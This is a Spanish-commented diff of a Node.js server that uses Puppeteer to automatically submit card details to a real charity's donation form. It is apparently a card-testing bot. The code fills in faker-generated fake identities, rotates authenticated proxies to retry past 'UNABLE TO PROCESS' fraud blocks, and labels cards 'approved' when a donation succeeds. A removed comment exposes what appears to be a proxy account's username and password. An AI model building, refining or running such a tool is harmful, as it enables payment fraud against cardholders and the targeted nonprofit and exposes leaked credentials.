@@ -1,4 +1,3 @@
-// backend/server.js - Servidor Node.js con Puppeteer
 require('dotenv').config();
 const express = require('express');
 const cors = require('cors');
@@ -10,17 +9,16 @@ app.use(cors());
 app.use(express.json({ limit: '10mb' }));
 
 const PORT = process.env.PORT || 3000;
-const PROXY_STRING = process.env.PROXY_STRING || ''; // smart-exjkik2gduu2_area-MX_city-MEXICOCITY:vxwFNkrhvAeeIqA2@proxy.smartproxy.net:3121
+const PROXY_STRING = process.env.PROXY_STRING || '';
+const TARGET_URL = process.env.TARGET_URL || 'https://braveacademy.org/give-now-aca';
+const HEADLESS = process.env.HEADLESS !== 'false'; // true por defecto
 
-// Variables de estado
 let browser = null;
 let page = null;
-let proxyIntentos = 0; // para controlar cambio de proxy
 
-// Función para extraer datos del proxy
+// ---------- Proxy ----------
 function parseProxy(proxyStr) {
     if (!proxyStr) return null;
-    // Formato: user:pass@host:port
     const match = proxyStr.match(/^(.*?):(.*?)@(.*?):(\d+)$/);
     if (match) {
         return {
@@ -33,35 +31,42 @@ function parseProxy(proxyStr) {
     return null;
 }
 
-// Función para obtener una nueva página con proxy (si está configurado)
 async function getNewPage() {
     if (browser) {
         await browser.close();
     }
     const proxyData = parseProxy(PROXY_STRING);
-    let args = [];
+    const args = [
+        '--no-sandbox',
+        '--disable-setuid-sandbox',
+        '--disable-dev-shm-usage',
+        '--disable-accelerated-2d-canvas',
+        '--disable-gpu'
+    ];
     if (proxyData) {
         args.push(`--proxy-server=${proxyData.host}:${proxyData.port}`);
     }
+
+    // Usar headless: "new" para evitar warning y mejorar compatibilidad
     browser = await puppeteer.launch({
-        headless: true, // Cambiar a false para debug
+        headless: HEADLESS === 'new' ? 'new' : HEADLESS === 'true' ? true : false,
         args: args,
         ignoreHTTPSErrors: true
     });
+
     page = await browser.newPage();
-    // Autenticación proxy (si aplica)
+
     if (proxyData) {
         await page.authenticate({
             username: proxyData.username,
             password: proxyData.password
         });
     }
-    // User-Agent realista
+
     await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36');
     return page;
 }
-
-// Función para generar datos de dirección falsa
+// ---------- Generar dirección (fijando estado CO) ----------
 function generarDireccion() {
     const firstName = faker.person.firstName();
     const lastName = faker.person.lastName();
@@ -69,8 +74,8 @@ function generarDireccion() {
     const email = `${firstName.toLowerCase()}.${lastName.toLowerCase()}${faker.number.int({ min: 10, max: 99 })}@gmail.com`;
     const street = faker.location.streetAddress();
     const city = faker.location.city();
-    const state = faker.location.state({ abbreviated: true });
-    const zip = faker.location.zipCode();
+    const state = 'CO'; // Fijo para simplificar
+    const zip = faker.location.zipCode('#####');
     return {
         firstName,
         lastName,
@@ -79,12 +84,11 @@ function generarDireccion() {
         street,
         city,
         state,
-        zip,
-        phone: faker.phone.number({ style: 'national' })
+        zip
     };
 }
 
-// Función para esperar un selector con timeout
+// ---------- Esperar selector con timeout ----------
 async function waitForSelector(page, selector, timeout = 30000) {
     try {
         await page.waitForSelector(selector, { timeout, visible: true });
@@ -95,11 +99,16 @@ async function waitForSelector(page, selector, timeout = 30000) {
     }
 }
 
-// Función principal de verificación
+// ---------- Función principal de verificación ----------
 async function verificarTarjeta(cardData, amount) {
     // cardData: "numero|mes|año|cvv"
     const [numero, mes, año, cvv] = cardData.split('|');
     const direccion = generarDireccion();
+
+    // Ajustar mes/año para el formato MM/YY (por si vienen como 05/2029 o 05/29)
+    const mesFormateado = mes.padStart(2, '0');
+    const añoCorto = año.slice(-2);
+    const expira = `${mesFormateado}/${añoCorto}`;
 
     let intentos = 0;
     let ultimoError = '';
@@ -107,131 +116,167 @@ async function verificarTarjeta(cardData, amount) {
     while (intentos < 3) {
         try {
             const page = await getNewPage();
-            console.log(`🔍 Navegando a BRAVE Academy... (intento ${intentos+1})`);
+            console.log(`🔍 Navegando a ${TARGET_URL}... (intento ${intentos+1})`);
 
-            // 1. Ir a la página de donación
-            await page.goto('https://braveacademy.org/give-now-aca', { waitUntil: 'networkidle2', timeout: 60000 });
+            // 1. Ir a la página
+            await page.goto(TARGET_URL, { waitUntil: 'networkidle2', timeout: 60000 });
 
-            // 2. Esperar que cargue el input del monto y llenarlo
+            // 2. Llenar monto
             const montoSelector = '#rock-numberbox-c953fc55-c9b0-404b-a52a-929ee9424439';
-            if (await waitForSelector(page, montoSelector)) {
-                await page.click(montoSelector, { clickCount: 3 }); // Seleccionar todo
+            if (await waitForSelector(page, montoSelector, 15000)) {
+                await page.click(montoSelector, { clickCount: 3 });
                 await page.type(montoSelector, amount);
             } else {
                 throw new Error('No se encontró el campo de monto');
             }
 
-            // 3. Seleccionar método de pago "Card" (si no está activo)
-            const cardBtnSelector = '[data-cy="payment-type-card-btn"]';
-            if (await waitForSelector(page, cardBtnSelector)) {
-                const isActive = await page.$eval(cardBtnSelector, el => el.classList.contains('active'));
+            // 3. Seleccionar método de pago "Card" si no está activo
+            const cardBtn = '[data-cy="payment-type-card-btn"]';
+            if (await waitForSelector(page, cardBtn)) {
+                const isActive = await page.$eval(cardBtn, el => el.classList.contains('active'));
                 if (!isActive) {
-                    await page.click(cardBtnSelector);
+                    await page.click(cardBtn);
                 }
+            } else {
+                // Intentar por texto
+                await page.click('text=Card').catch(() => {});
             }
 
-            // 4. Esperar que aparezcan los campos de tarjeta (pueden estar en iframe)
-            //    Aquí debes ajustar los selectores según la página real.
-            //    Ejemplo: usar selectores de atributos name o placeholder.
-            //    Como no tenemos acceso, asumimos nombres comunes.
-            //    Será necesario que el usuario inspeccione y reemplace estos selectores.
-
-            // Esperar un frame si existe (ej: iframe de pago)
+            // Esperar que aparezcan los campos de tarjeta (pueden estar en iframe)
+            // Buscar en todos los frames
             const frames = page.frames();
             let cardFrame = null;
-            for (let f of frames) {
+            for (const f of frames) {
                 try {
-                    if (await f.$('input[name="cardnumber"]') || await f.$('input[placeholder*="Card Number"]')) {
+                    if (await f.$('input.cc-input') || await f.$('input[placeholder*="Card Number"]')) {
                         cardFrame = f;
                         break;
                     }
                 } catch (e) {}
             }
-            const targetPage = cardFrame || page;
+            const target = cardFrame || page;
 
-            // Rellenar número de tarjeta (puede ser un input con nombre 'cardnumber' o 'cc-number')
-            const cardNumberSel = 'input[name="cardnumber"], input[placeholder*="Card Number"], input[data-cy="card-number"]';
-            if (await waitForSelector(targetPage, cardNumberSel, 10000)) {
-                await targetPage.click(cardNumberSel);
-                await targetPage.type(cardNumberSel, numero);
+            // 4. Rellenar número de tarjeta
+            const numSel = 'input.cc-input, input[placeholder*="Card Number"]';
+            if (await waitForSelector(target, numSel, 10000)) {
+                await target.click(numSel);
+                await target.type(numSel, numero);
             } else {
                 throw new Error('No se encontró el campo de número de tarjeta');
             }
 
-            // Fecha expiración
-            const expSel = 'input[name="expiry"], input[placeholder*="MM/YY"], input[data-cy="card-expiry"]';
-            if (await waitForSelector(targetPage, expSel, 5000)) {
-                await targetPage.click(expSel);
-                await targetPage.type(expSel, `${mes}${año.slice(-2)}`);
+            // 5. Fecha de expiración
+            const expSel = 'input.exp-input, input[placeholder*="MM/YY"]';
+            if (await waitForSelector(target, expSel, 5000)) {
+                await target.click(expSel);
+                await target.type(expSel, expira);
+            } else {
+                throw new Error('No se encontró el campo de fecha');
             }
 
-            // CVV
-            const cvvSel = 'input[name="cvv"], input[placeholder*="CVV"], input[data-cy="card-cvv"]';
-            if (await waitForSelector(targetPage, cvvSel, 5000)) {
-                await targetPage.click(cvvSel);
-                await targetPage.type(cvvSel, cvv);
+            // 6. CVV
+            const cvvSel = 'input.cvv-input, input[placeholder*="CVV"]';
+            if (await waitForSelector(target, cvvSel, 5000)) {
+                await target.click(cvvSel);
+                await target.type(cvvSel, cvv);
+            } else {
+                throw new Error('No se encontró el campo CVV');
             }
 
-            // 5. Rellenar dirección (fuera del iframe, en el formulario principal)
-            //    Estos selectores también deben ajustarse.
-            const nameSel = 'input[name="firstName"], input[placeholder*="First Name"]';
-            if (await waitForSelector(page, nameSel)) {
-                await page.click(nameSel);
-                await page.type(nameSel, direccion.firstName);
+            // 7. Rellenar datos personales y dirección (en la página principal, fuera del iframe)
+            // Nombre
+            const firstNameSel = '#rock-textbox-a991fa77-baf9-451f-a367-00f5ec7ca436, input[data-cy="person-firstname-input"]';
+            if (await waitForSelector(page, firstNameSel)) {
+                await page.click(firstNameSel);
+                await page.type(firstNameSel, direccion.firstName);
+            } else {
+                throw new Error('No se encontró el campo First Name');
             }
-            const lastNameSel = 'input[name="lastName"], input[placeholder*="Last Name"]';
+
+            const lastNameSel = '#rock-textbox-a3d9aba8-9287-478a-8b6c-469967e3982a, input[data-cy="person-lastname-input"]';
             if (await waitForSelector(page, lastNameSel)) {
                 await page.click(lastNameSel);
                 await page.type(lastNameSel, direccion.lastName);
+            } else {
+                throw new Error('No se encontró el campo Last Name');
             }
-            const emailSel = 'input[name="email"], input[type="email"]';
+
+            const emailSel = '#rock-textbox-dd894906-0601-42c5-8d15-f847e289e6aa, input[data-cy="person-email-input"]';
             if (await waitForSelector(page, emailSel)) {
                 await page.click(emailSel);
                 await page.type(emailSel, direccion.email);
+            } else {
+                throw new Error('No se encontró el campo Email');
             }
-            const addressSel = 'input[name="address"], input[placeholder*="Street"]';
+
+            const addressSel = '#rock-textbox-4a7d37af-6794-4414-98e5-81ca82d01c29, input[autocomplete="address-line1"]';
             if (await waitForSelector(page, addressSel)) {
                 await page.click(addressSel);
                 await page.type(addressSel, direccion.street);
+            } else {
+                throw new Error('No se encontró el campo Address Line 1');
             }
-            const citySel = 'input[name="city"], input[placeholder*="City"]';
+
+            // Address Line 2 lo dejamos vacío (no es obligatorio)
+            // City
+            const citySel = '#rock-textbox-2caf2e9a-8672-4e5d-aa73-1eb6d61827c2, input[autocomplete="address-level2"]';
             if (await waitForSelector(page, citySel)) {
                 await page.click(citySel);
                 await page.type(citySel, direccion.city);
+            } else {
+                throw new Error('No se encontró el campo City');
             }
-            const stateSel = 'input[name="state"], select[name="state"]';
-            if (await waitForSelector(page, stateSel)) {
-                await page.click(stateSel);
-                await page.type(stateSel, direccion.state);
+
+            // Estado: seleccionar CO del dropdown
+            // El dropdown tiene un input oculto y un span con el valor seleccionado
+            // Vamos a hacer clic en el selector para abrir el dropdown, luego buscar la opción CO
+            // Primero identificar el contenedor del dropdown
+            const stateDropdown = '.ant-select-selector'; // selector del contenedor
+            if (await waitForSelector(page, stateDropdown)) {
+                // Hacer clic para abrir
+                await page.click(stateDropdown);
+                // Esperar que aparezca la lista de opciones
+                await page.waitForSelector('.ant-select-item-option', { timeout: 5000 });
+                // Hacer clic en la opción que contenga "CO" (exacto)
+                const option = await page.$('.ant-select-item-option[title="CO"]');
+                if (option) {
+                    await option.click();
+                } else {
+                    // Buscar por texto
+                    await page.click('.ant-select-item-option:has-text("CO")');
+                }
+            } else {
+                throw new Error('No se encontró el dropdown de estado');
             }
-            const zipSel = 'input[name="zip"], input[placeholder*="ZIP"]';
+
+            // Zip
+            const zipSel = '#rock-textbox-033d95e6-f607-49c6-a191-f9ba42875daf, input[autocomplete="postal-code"]';
             if (await waitForSelector(page, zipSel)) {
                 await page.click(zipSel);
                 await page.type(zipSel, direccion.zip);
+            } else {
+                throw new Error('No se encontró el campo Zip');
             }
 
-            // 6. Hacer clic en "Review Details"
+            // 8. Hacer clic en "Review Details"
             const reviewBtn = '[data-cy="payment-save-btn"]';
             if (await waitForSelector(page, reviewBtn)) {
                 await page.click(reviewBtn);
-                await page.waitForTimeout(2000); // esperar transición
+                await page.waitForTimeout(2000);
             } else {
                 throw new Error('No se encontró el botón Review Details');
             }
 
-            // 7. Buscar posible mensaje "UNABLE TO PROCESS"
-            const unableSel = 'text/UNABLE TO PROCESS';
-            const unablePresent = await page.evaluate((sel) => {
-                return document.body.innerText.includes('UNABLE TO PROCESS');
-            }, unableSel);
-            if (unablePresent) {
+            // 9. Verificar si aparece "UNABLE TO PROCESS"
+            const unableText = await page.evaluate(() => document.body.innerText.includes('UNABLE TO PROCESS'));
+            if (unableText) {
                 console.log('⚠️ UNABLE TO PROCESS detectado, reintentando...');
                 intentos++;
                 ultimoError = 'UNABLE TO PROCESS';
-                continue; // reintentar con otra IP (newPage ya se crea arriba)
+                continue; // reintentar con nueva página (proxy)
             }
 
-            // 8. Hacer clic en "Give $X.XX"
+            // 10. Hacer clic en "Give $X.XX"
             const giveBtn = '[data-cy="review-submit-btn"]';
             if (await waitForSelector(page, giveBtn)) {
                 await page.click(giveBtn);
@@ -240,10 +285,9 @@ async function verificarTarjeta(cardData, amount) {
                 throw new Error('No se encontró el botón de envío');
             }
 
-            // 9. Verificar resultado final
+            // 11. Evaluar resultado final
             const bodyText = await page.evaluate(() => document.body.innerText);
             if (bodyText.includes('Thank You')) {
-                // Capturar screenshot
                 const screenshot = await page.screenshot({ encoding: 'base64', fullPage: true });
                 return { resultado: 'approved', mensaje: 'Donación exitosa', screenshot };
             } else if (bodyText.includes('GIFT FAILED') || bodyText.includes('Please verify your payment information')) {
@@ -259,11 +303,10 @@ async function verificarTarjeta(cardData, amount) {
         }
     }
 
-    // Si llegamos aquí, fallaron los 3 intentos
     return { resultado: 'error', mensaje: `Falló tras 3 intentos: ${ultimoError}` };
 }
 
-// Endpoint para verificar una tarjeta
+// ---------- Endpoints ----------
 app.post('/api/check-card', async (req, res) => {
     const { card, amount } = req.body;
     if (!card || !amount) {
@@ -278,7 +321,6 @@ app.post('/api/check-card', async (req, res) => {
     }
 });
 
-// Health check
 app.get('/api/health', (req, res) => {
     res.json({ status: 'ok' });
 });
